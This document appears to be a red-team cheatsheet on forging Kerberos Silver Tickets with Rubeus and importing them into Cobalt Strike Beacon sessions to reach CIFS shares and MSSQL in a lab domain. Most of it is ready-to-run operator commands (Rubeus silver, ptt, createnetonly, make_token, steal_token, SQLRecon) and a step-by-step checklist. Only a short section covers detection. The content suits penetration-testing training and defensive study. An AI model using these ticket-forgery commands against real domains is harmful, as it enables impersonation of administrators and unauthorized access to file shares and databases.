---
title: "Kerberos Silver Tickets"
description: "Forge a service-specific ticket using the service account key, import it into a network-only session, and verify CIFS or MSSQL access."
category: "Domain Dominance"
tools: ["Cobalt Strike", "Rubeus", "SQLRecon", "Kerbeus BOF"]
updated: 2026-11-16
tags: ["domain-dominance", "kerberos", "silver-ticket", "ticket-forgery"]
draft: false
---

## 1. Why the attack works

A Silver Ticket is a service ticket built offline using the compromised key of the account running the target service. For a machine-backed CIFS service, that is the computer account's key. For SQL Server running under a domain service account, it is that service account's key.

The scope is the service and target that can decrypt and accept the ticket. This is not a TGT and does not let the client request arbitrary service tickets as if it possessed `krbtgt`'s key. PAC validation and current service/KDC protections may reject a service-key-only forgery.

| Required value | Meaning |
|---|---|
| Service account key | Matching AES or RC4 material for the actual service account |
| `/service` | Exact target SPN |
| `/sid` | Domain SID, excluding the user's RID |
| `/user`, `/id`, `/groups` | Intended username, user RID and group RIDs in the PAC |

## 2. Build a CIFS ticket

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:<COMPUTER_AES256_KEY> /user:Administrator /id:500 /groups:513,512 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
# Retain the complete output ticket for Administrator -> cifs/lon-db-1.
```

Explicit identity and group values avoid silently relying on Rubeus defaults. RID `500` and the groups above describe the lab's built-in domain Administrator example, not every administrative account. Use the actual directory values for a different identity.

## 3. Import and verify

```shell
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<CIFS_TICKET_BASE64>
beacon> run klist
# Client: Administrator; server: cifs/lon-db-1.
beacon> ls \\lon-db-1\c$
```

The network-only session label does not forge the identity; the imported ticket does. Match the destination name to the ticket's SPN. A successful import confirms cache insertion, not remote acceptance.

## 4. MSSQL service account example

Knowing the SQL service account's password does not mean that account is a SQL `sysadmin`. The notes instead construct a ticket for `rsteel`, whose database permissions must be checked independently.

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:<SERVICE_PASSWORD>
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:<SERVICE_RC4_KEY> /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

Those RIDs belong to the supplied lab. The RC4 variant requires support in the target environment; do not assume that modern domains accept it.

```shell
beacon> make_token CONTOSO\rsteel FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<MSSQL_TICKET_BASE64>
beacon> run klist
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info
# Confirm CurrentLogon; separately verify SQL roles and permissions.
```

Use a fresh disposable session for each identity rather than mixing the CIFS and MSSQL examples in an existing cache.

## Ticket import alternatives

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
beacon> ls \\lon-db-1\c$
```

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
beacon> ls \\lon-db-1\c$
```

For the MSSQL variant, use `CONTOSO\rsteel`, the final MSSQL ticket and the SQL verification command above; a SQL-only ticket does not provide CIFS access.

## Session cleanup

Purge the disposable network-only session while its token is still selected, then restore Beacon's original token. `rev2self` alone does not purge tickets.

```shell
# Native cleanup
beacon> kerberos_ticket_purge
beacon> rev2self
```

## Troubleshooting and detection

| Symptom | Check |
|---|---|
| Cannot decrypt the ticket | Wrong service account key, rotation or encryption type |
| Logon rejected despite correct key | PAC signatures and validation enforced by the target |
| SQL connects but privileged actions fail | Actual SQL authorization, not just the Windows login name |
| Unexpected identity | Selected logon session, existing cache and SPN matching |

A target logon (`4624`) without a matching DC service-ticket request (`4769`) can be a useful correlation signal because the service ticket was built offline. Cache reuse, audit coverage and multiple DCs must be considered before calling that a forgery. Rotation of the affected service account key limits future use of its stolen material.

## Quick checklist

```text
BUILD THE SERVICE TICKET
[ ] Identify the actual account running the target service and its current key.
[ ] Record the exact SPN, realm, domain SID, user RID and intended group RIDs.
[ ] Select an encryption type supported by the target.
[ ] Rubeus silver -> use the service account key, not an unrelated computer or krbtgt key.
[ ] Confirm the generated ticket's client and exact target service.
[ ] For CIFS, select the machine-backed cifs/lon-db-1 ticket.
[ ] For MSSQL, select the MSSQLSvc ticket and verify SQL permissions separately.
[ ] Account for PAC validation: a generated ticket is not proof of remote acceptance.

IMPORT AND VERIFY — CHOOSE ONE PATH
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
# Rubeus Alternative
[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
[ ] run klist -> verify the selected session, client identity, target and expiry.
[ ] ls \\lon-db-1\c$ -> verify actual service authorization.
[ ] For MSSQL instead: use rsteel and the MSSQL ticket, then SQLRecon /m:info; do not test CIFS with a SQL ticket.

CLEANUP
[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
[ ] rev2self -> restore the original token.
[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
```

## Related references

- [Golden Tickets](/cheatsheets/golden-ticket-cheatsheet/)
- [MSSQL abuse](/cheatsheets/mssql-cobalt-cheatsheet/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
